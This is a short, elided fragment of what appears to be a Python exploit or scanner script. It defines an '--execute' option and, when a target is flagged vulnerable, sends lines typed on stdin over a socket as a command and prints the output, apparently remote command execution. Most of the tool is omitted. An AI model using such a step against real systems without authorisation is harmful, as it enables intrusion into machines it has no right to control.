...
command_group.add_argument('--execute', help='run a command and dump straight to stdout', action="store_true")
...
if args.is_vuln :
	...
	sys.stdout.write(send_message(s, endianness, 7, sys.stdin.readline().strip('\n'))[1])
